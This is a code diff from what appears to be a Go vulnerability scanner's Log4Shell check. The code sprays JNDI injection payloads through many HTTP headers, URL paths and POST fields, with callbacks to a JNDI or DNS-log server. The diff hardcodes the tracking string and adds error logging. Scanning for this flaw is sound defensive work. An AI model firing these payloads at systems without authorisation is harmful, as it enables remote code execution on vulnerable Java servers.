@@ -105,7 +105,7 @@ func VCenter(u string) bool {
 func Check(u string, finalURL string) bool {
 	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
 		var host = "null"
-		randomstr := util.RandomStr()
+		randomstr := "UpX34defineClass" //util.RandomStr()
 		if ux, err := url.Parse(strings.TrimSpace(u)); err == nil {
 			host = strings.Replace(ux.Host, ":", ".", -1)
 		}
@@ -117,7 +117,7 @@ func Check(u string, finalURL string) bool {
 			for _, payload := range log4jJndiPayloads {
 				var uri string
 				if jndi.JndiAddress != "" {
-					uri = jndi.JndiAddress + "/" + randomstr + "/"
+					uri = jndi.JndiAddress + "/" + randomstr
 				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
 					uri = randomstr + "." + host + "." + util.CeyeDomain
 				}
@@ -126,6 +126,9 @@ func Check(u string, finalURL string) bool {
 				header := make(map[string]string)
 				header["Content-Type"] = "application/x-www-form-urlencoded"
 				header["User-Agent"] = payload
+				// docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+				header["X-Api-Version"] = payload
+				//log.Println("payload", payload)
 				/* struts2 对静态文件 进行处理 If-Modified-Since，struts2默认静态文件
 				tooltip.gif
 				domtt.css
@@ -148,9 +151,6 @@ func Check(u string, finalURL string) bool {
 				header["Originating-IP"] = payload
 				header["X-Real-IP"] = payload
 				header["Forwarded"] = payload
-				// docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-				header["X-Api-Version"] = payload
-
 				header["X-Wap-Profile"] = payload
 				header["Contact"] = payload
 				header["Forwarded"] = payload
@@ -158,7 +158,14 @@ func Check(u string, finalURL string) bool {
 				header["Token"] = payload
 				header["Cookie"] = "JSESSIONID=" + payload
 				// 包含strus2 根目录
-				_, _ = util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
+				_, err := util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
+				if nil != err {
+					log.Println("POST", domain+"/"+payload, err)
+				}
+				_, err = util.HttpRequset(domain, "GET", "", false, header)
+				if nil != err {
+					log.Println("GET", domain, err)
+				}
 				_, _ = util.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 				_, _ = util.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 
